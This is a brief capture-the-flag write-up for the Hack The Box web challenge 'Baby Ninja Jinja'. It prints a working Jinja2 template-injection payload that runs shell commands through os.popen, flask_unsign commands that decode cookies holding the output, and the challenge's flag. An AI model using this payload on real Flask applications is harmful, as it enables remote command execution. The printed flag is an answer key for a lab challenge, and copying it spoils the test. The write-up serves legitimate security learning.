---
layout: single
title: Baby Ninja Jinja [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - Server Site Template Injection (SSTI)
---

## Server Site Template Injection (SSTI)

### Payload:
`{ % +if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{     %+endif+%}&se=asdf&os=os&command=ls`
Send with burp and catch the cookie 


### Decrypt the cookie
`python3 -m flask_unsign --decode --cookie 'eyJhc2RmIjp7IiBiIjoiWVhCd0xuQjVDbVpzWVdkZlVEVTBaV1FLYzJOb1pXMWhMbk54YkFwemRHRjBhV01LZEdWdGNHeGhkR1Z6Q2c9PSJ9fQ.YbjQqA.93wY4QZCcECpbS6nymhYxOknl-g'`<br><br>
Results
`{'asdf': b'app.py\nflag_P54ed\nschema.sql\nstatic\ntemplates\n'}`

### Decrypt the cookie with the flag
`python3 -m flask_unsign --decode --cookie 'eyJhc2RmIjp7IiBiIjoiU0ZSQ2UySTBZbmxmYm1sdWFqUnpYMlF3Ym5SZlp6TjBYM0YxTUhRelpGOHdjbDlqTkhWbmFGUjlDZz09In19.YbjREw.5Md5yXa0JNbPGEgdpxIAWr5A69Q'` <br> <br>
Results
`{'asdf': b'HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}\n'}
`

